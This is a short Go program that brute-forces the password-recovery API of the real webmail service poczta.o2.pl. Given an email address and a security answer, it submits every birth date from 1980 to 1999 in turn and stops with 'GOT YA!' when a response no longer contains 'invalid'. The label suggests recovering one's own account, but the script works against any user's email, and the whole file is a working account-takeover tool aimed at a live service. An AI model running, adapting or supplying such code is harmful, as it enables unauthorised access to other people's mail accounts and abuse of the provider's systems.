package main

import (
	"bufio"
	"bytes"
	"fmt"
	"time"
	"io/ioutil"
	"net/http"
	"strings"
	"os"
)

func main() {
	url := "https://poczta.o2.pl/api/v1/public/recovery/qa"

	minDay := 1;
	maxDay := 31;
	minMonth := 1;
	maxMonth := 12;
	maxYear := 1999;
	minYear := 1980;
	
	email := getUserInput("Email?");
	answer := getUserInput("Forgot answer?");

	fmt.Println("URL:>", url)

	getAccountBack:
	for year := minYear; year <= maxYear; year++ {
		for month := minMonth; month <= maxMonth; month++ {
			for day := minDay; day <= maxDay; day++ {
				date := fmt.Sprintf("%d-%02d-%02d", year, month, day)
				jsonWithDate := fmt.Sprintf(`
					{
							"email": "%v",
							"answers":["%v"],
							"birthDate": "%v"
					}
				`, email, answer, date);

				var jsonStr = []byte(jsonWithDate);

				req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
				req.Header.Set("Content-Type", "application/json")

				client := &http.Client{}
				resp, err := client.Do(req)
				if err != nil {
					panic(err)
				}
				defer resp.Body.Close()

				fmt.Println("Checking Email:", email)
				fmt.Println("Checking Answer:", answer);					
				fmt.Println("Checking Date:", date);
				fmt.Println("Response Status:", resp.Status)
				body, _ := ioutil.ReadAll(resp.Body)
				fmt.Println("Response Body:", string(body))

				if(!strings.Contains(string(body), "invalid")) {
					fmt.Println("GOT YA!");
					break getAccountBack
				}

				time.Sleep(5 * time.Second);
			}
		}
	}		
}

func getUserInput(askMessage string) string {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println(askMessage);
	fmt.Print("-> ");
	text, _ := reader.ReadString('\n')

  return strings.Replace(text, "\n", "", -1)
}